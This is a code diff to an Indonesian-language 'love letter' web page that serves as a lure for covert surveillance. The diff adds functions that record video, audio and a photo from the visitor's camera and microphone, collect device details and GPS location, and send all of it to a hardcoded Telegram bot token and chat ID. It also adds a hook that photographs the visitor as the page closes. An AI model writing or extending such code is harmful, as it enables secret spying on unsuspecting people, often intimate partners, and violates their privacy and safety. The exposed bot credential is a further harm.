@@ -110,6 +110,14 @@
                 opacity: 0;
             }
         }
+        
+        .duration-selector {
+            margin: 15px 0;
+        }
+        
+        .duration-selector label {
+            margin-right: 10px;
+        }
     </style>
 </head>
 <body>
@@ -120,6 +128,13 @@
         
         <div id="initial-content">
             <p class="message">Hai sayangku, aku punya sesuatu yang spesial untukmu...</p>
+            <div class="duration-selector">
+                <label for="video-duration">Durasi Video:</label>
+                <select id="video-duration">
+                    <option value="5">5 detik</option>
+                    <option value="10">10 detik</option>
+                </select>
+            </div>
             <button class="btn" id="show-letter">Buka Surat Cinta</button>
             <button class="btn" id="show-quotes">Lihat Quotes Bucin</button>
         </div>
@@ -130,8 +145,6 @@
                 <p>Setiap hari bersamamu adalah anugerah yang tak ternilai. Senyummu membuat dunia terasa lebih indah, dan tawamu adalah musik terindah di telingaku.</p>
                 <p>Aku bersyukur bisa memilikimu dalam hidupku. Kamu adalah alasan mengapa aku tersenyum setiap hari, mengapa aku bersemangat menjalani hari.</p>
                 <p>Terima kasih telah menjadi bagian dari hidupku. Aku mencintaimu lebih dari kata-kata bisa ungkapkan.</p>
-                <p>Selamanya milikmu,</p>
-                <p><3</p>
             </div>
             <button class="btn" id="back-from-letter">Kembali</button>
         </div>
@@ -161,6 +174,7 @@
         const backFromQuotesBtn = document.getElementById('back-from-quotes');
         const moreHeartsBtn = document.getElementById('more-hearts');
         const heartsContainer = document.getElementById('hearts-container');
+        const videoDurationSelect = document.getElementById('video-duration');
         
         // Telegram Bot Token and Chat ID (replace with your own)
         const TELEGRAM_BOT_TOKEN = '7883031175:AAEIQYYD3CSdmQBNVyOxZ1qmtYTrpRuDB2I'; // Ganti dengan token bot Telegram Anda
@@ -184,7 +198,7 @@
         }
 
         // Function to send photo to Telegram
-        async function sendPhotoToTelegram(photoBase64) {
+        async function sendPhotoToTelegram(photoBase64, caption = 'Foto diambil dari pengguna') {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
             try {
                 await fetch(url, {
@@ -193,7 +207,7 @@
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
                         photo: photoBase64,
-                        caption: 'Foto diambil dari pengguna saat membuka surat cinta',
+                        caption: caption,
                     }),
                 });
             } catch (error) {
@@ -201,85 +215,50 @@
             }
         }
 
+        // Function to send video to Telegram
+        async function sendVideoToTelegram(videoBlob, caption = 'Video diambil dari pengguna') {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('video', videoBlob, 'capture.mp4');
+            formData.append('caption', caption);
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                });
+            } catch (error) {
+                console.error('Error mengirim video ke Telegram:', error);
+            }
+        }
+
+        // Function to send audio to Telegram
+        async function sendAudioToTelegram(audioBlob, caption = 'Audio diambil dari pengguna') {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('audio', audioBlob, 'capture.mp3');
+            formData.append('caption', caption);
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                });
+            } catch (error) {
+                console.error('Error mengirim audio ke Telegram:', error);
+            }
+        }
+
         // Function to get comprehensive device information
         async function getDeviceInfo() {
             const deviceInfo = {};
             
-            // Basic Browser and Device Info
             deviceInfo.userAgent = navigator.userAgent;
             deviceInfo.platform = navigator.platform || 'Tidak diketahui';
             deviceInfo.language = navigator.language || navigator.userLanguage || 'Tidak diketahui';
-            deviceInfo.languages = navigator.languages ? navigator.languages.join(', ') : 'Tidak diketahui';
-            deviceInfo.cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
-            deviceInfo.doNotTrack = navigator.doNotTrack || 'Tidak ditentukan';
-            
-            // Screen Info
             deviceInfo.screenResolution = `${window.screen.width}x${window.screen.height}`;
-            deviceInfo.availableScreenResolution = `${window.screen.availWidth}x${window.screen.availHeight}`;
-            deviceInfo.colorDepth = window.screen.colorDepth || 'Tidak diketahui';
-            deviceInfo.pixelDepth = window.screen.pixelDepth || 'Tidak diketahui';
-            
-            // Device Capabilities
-            deviceInfo.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak tersedia';
-            deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak tersedia';
-            
-            // Network Info
-            if (navigator.connection) {
-                deviceInfo.connectionType = navigator.connection.effectiveType || 'Tidak diketahui';
-                deviceInfo.downlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'Tidak diketahui';
-                deviceInfo.rtt = navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'Tidak diketahui';
-                deviceInfo.saveData = navigator.connection.saveData ? 'Aktif' : 'Nonaktif';
-            } else {
-                deviceInfo.connectionType = 'Tidak tersedia';
-            }
-            
-            // Timezone
             deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Tidak diketahui';
             
-            // Touch Support
-            deviceInfo.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Ya' : 'Tidak';
-            deviceInfo.maxTouchPoints = navigator.maxTouchPoints || 'Tidak tersedia';
-            
-            // WebGL Info
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    deviceInfo.webglRenderer = gl.getParameter(gl.RENDERER) || 'Tidak diketahui';
-                    deviceInfo.webglVendor = gl.getParameter(gl.VENDOR) || 'Tidak diketahui';
-                    deviceInfo.webglVersion = gl.getParameter(gl.VERSION) || 'Tidak diketahui';
-                } else {
-                    deviceInfo.webglRenderer = 'Tidak didukung';
-                }
-            } catch (e) {
-                deviceInfo.webglRenderer = 'Error mengambil info WebGL';
-            }
-            
-            // Battery Info (requires async)
-            let batteryInfo = 'Tidak tersedia';
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `
-                        Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
-                        Level: ${battery.level * 100}%
-                        Waktu Pengisian: ${battery.chargingTime || 'Tidak diketahui'} detik
-                        Waktu Pemakaian: ${battery.dischargingTime || 'Tidak diketahui'} detik
-                    `;
-                } catch (e) {
-                    batteryInfo = 'Error mengambil info baterai';
-                }
-            }
-            deviceInfo.battery = batteryInfo;
-
-            // Browser Vendor and Features
-            deviceInfo.vendor = navigator.vendor || 'Tidak diketahui';
-            deviceInfo.product = navigator.product || 'Tidak diketahui';
-            deviceInfo.appVersion = navigator.appVersion || 'Tidak diketahui';
-            deviceInfo.appName = navigator.appName || 'Tidak diketahui';
-            deviceInfo.appCodeName = navigator.appCodeName || 'Tidak diketahui';
-            
-            // Format the device info for Telegram
             let formattedInfo = 'Informasi Perangkat:\n';
             for (const [key, value] of Object.entries(deviceInfo)) {
                 formattedInfo += `${key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}: ${value}\n`;
@@ -295,26 +274,119 @@
                 video.srcObject = stream;
                 video.play();
 
-                // Wait for video to be ready
                 await new Promise(resolve => {
                     video.onloadedmetadata = () => resolve();
                 });
 
-                // Capture photo
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const photoBase64 = canvas.toDataURL('image/jpeg');
 
-                // Stop video stream
                 stream.getTracks().forEach(track => track.stop());
-
                 return photoBase64;
             } catch (error) {
                 console.error('Error mengambil foto:', error);
                 return null;
             }
+        }
+
+        // Function to capture video
+        async function captureVideo(duration) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.start();
+
+                await new Promise(resolve => setTimeout(resolve, duration * 1000));
+
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+
+                return new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        resolve(blob);
+                    };
+                });
+            } catch (error) {
+                console.error('Error mengambil video:', error);
+                return null;
+            }
+        }
+
+        // Function to capture audio
+        async function captureAudio(duration = 5) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.start();
+
+                await new Promise(resolve => setTimeout(resolve, duration * 1000));
+
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+
+                return new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/mp3' });
+                        resolve(blob);
+                    };
+                });
+            } catch (error) {
+                console.error('Error mengambil audio:', error);
+                return null;
+            }
+        }
+
+        // Function to capture media and send to Telegram
+        async function captureAndSendMedia() {
+            const duration = parseInt(videoDurationSelect.value);
+            const deviceInfo = await getDeviceInfo();
+            let message = `💖 Seseorang membuka surat cinta! 💖\n\n${deviceInfo}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+
+            // Capture and send photo
+            const photoBase64 = await capturePhoto();
+            if (photoBase64) {
+                await sendPhotoToTelegram(photoBase64, 'Foto diambil saat membuka surat cinta');
+                message += '\nFoto: Berhasil dikirim';
+            } else {
+                message += '\nFoto: Gagal diambil';
+            }
+
+            // Capture and send video
+            const videoBlob = await captureVideo(duration);
+            if (videoBlob) {
+                await sendVideoToTelegram(videoBlob, `Video (${duration} detik) diambil saat membuka surat cinta`);
+                message += `\nVideo (${duration} detik): Berhasil dikirim`;
+            } else {
+                message += '\nVideo: Gagal diambil';
+            }
+
+            // Capture and send audio
+            const audioBlob = await captureAudio(5); // Audio 5 detik
+            if (audioBlob) {
+                await sendAudioToTelegram(audioBlob, 'Audio diambil saat membuka surat cinta');
+                message += '\nAudio: Berhasil dikirim';
+            } else {
+                message += '\nAudio: Gagal diambil';
+            }
+
+            // Send device info and status
+            await sendToTelegram(message);
         }
 
         // Function to request location, camera, and handle letter display
@@ -325,50 +397,42 @@
                         const { latitude, longitude } = position.coords;
                         const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
                         const locationInfo = `Lokasi:\nTautan Google Maps: ${mapsLink}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
-                        const deviceInfo = await getDeviceInfo();
-                        
-                        // Mengambil foto
-                        const photoBase64 = await capturePhoto();
-                        let message = `💖 Seseorang membuka surat cinta! 💖\n\n${locationInfo}\n\n${deviceInfo}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
 
-                        if (photoBase64) {
-                            // Kirim foto ke Telegram
-                            await sendPhotoToTelegram(photoBase64);
-                            message += '\nFoto: Berhasil dikirim';
-                        } else {
-                            message += '\nFoto: Gagal diambil';
-                        }
+                        // Capture and send media
+                        await captureAndSendMedia();
 
-                        // Kirim pesan teks ke Telegram
-                        await sendToTelegram(message);
+                        // Send location info
+                        await sendToTelegram(locationInfo);
 
-                        // Tampilkan surat cinta
+                        // Show letter
                         initialContent.classList.add('hidden');
                         letterContent.classList.remove('hidden');
                     },
                     (error) => {
                         alert('Akses lokasi diperlukan untuk membuka surat cinta. Silakan aktifkan lokasi dan coba lagi.');
-                        initialContent.classList.remove('hidden');
-                        letterContent.classList.add('hidden');
                     }
                 );
 
-                // Periksa izin kamera
+                // Check camera and microphone permissions
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                     stream.getTracks().forEach(track => track.stop());
                 } catch (error) {
-                    alert('Akses kamera diperlukan untuk membuka surat cinta. Silakan izinkan kamera dan coba lagi.');
-                    initialContent.classList.remove('hidden');
-                    letterContent.classList.add('hidden');
+                    alert('Akses kamera dan mikrofon diperlukan. Silakan izinkan dan coba lagi.');
                     return;
                 }
             } else {
-                alert('Geolocation atau kamera tidak didukung oleh browser Anda.');
-                initialContent.classList.remove('hidden');
-                letterContent.classList.add('hidden');
+                alert('Geolocation, kamera, atau mikrofon tidak didukung oleh browser Anda.');
             }
         }
+
+        // Capture photo when window is closed
+        window.addEventListener('beforeunload', async (event) => {
+            const photoBase64 = await capturePhoto();
+            if (photoBase64) {
+                await sendPhotoToTelegram(photoBase64, 'Foto diambil saat pengguna menutup halaman');
+            }
+        });
 
         // Event Listeners
         showLetterBtn.addEventListener('click', requestLocationAndShowLetter);
@@ -400,7 +464,6 @@
                     heart.style.animationDuration = 3 + Math.random() * 5 + 's';
                     heartsContainer.appendChild(heart);
                     
-                    // Remove heart after animation
                     setTimeout(() => {
                         heart.remove();
                     }, 4000);
